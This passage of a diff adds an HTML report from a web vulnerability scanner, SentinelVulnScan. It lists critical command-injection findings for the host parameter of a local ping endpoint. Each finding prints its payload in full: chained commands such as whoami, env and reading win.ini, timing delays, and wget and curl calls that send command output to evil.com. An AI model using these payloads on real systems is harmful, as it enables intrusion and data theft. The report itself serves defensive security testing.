+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>| whoami</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>; sleep 5</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>& timeout 5</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>; id</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>| id</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>& id</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>; echo $PATH</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>| echo $PATH</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>; env</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>& set</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>| type C:\Windows\win.ini</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>; uname -a</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>& systeminfo</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>& ping -n 15 127.0.0.1</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>; sleep 15</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>`sleep 15`</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>$(sleep 15)</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>& nslookup uniqueid.evil.com</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>; wget http://evil.com?data=$(whoami)</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="vulnerability critical">
+            <h3>CommandInjection vulnerability found in host parameter</h3>
+            <div class="vulnerability-details">
+                <div class="label">Severity:</div><div>Critical</div>
+                <div class="label">URL:</div><div>http://localhost:5000/ping?host=localhost</div>
+                <div class="label">Method:</div><div>GET</div>
+                <div class="label">Parameter:</div><div>host</div>
+                <div class="label">Payload:</div><div>| curl http://evil.com?data=$(whoami)</div>
+                <div class="label">CWE ID:</div><div>CWE-78</div>
+                <div class="label">Impact:</div><div>Command Injection can lead to execution of arbitrary commands on the host system, potentially resulting in complete system compromise, data theft, and service disruption. An attacker can use this vulnerability to gain unauthorized access to the underlying server.</div>
+                <div class="label">Remediation:</div><div>Avoid passing user input to system commands. If necessary, implement strict input validation and whitelisting. Use language-specific libraries instead of system commands. Run with reduced privileges. Implement proper error handling that doesn't expose system information.</div>
+                <div class="label">Evidence:</div><div class="evidence">Simulated response contains command output that indicates successful command execution</div>
+            </div>
+        </div>
+        <div class="footer">
+            <p>Report generated by SentinelVulnScan - Web Vulnerability Scanner</p>
+            <p>© 2025</p>
+        </div>
+    </div>
+</body>
+</html>
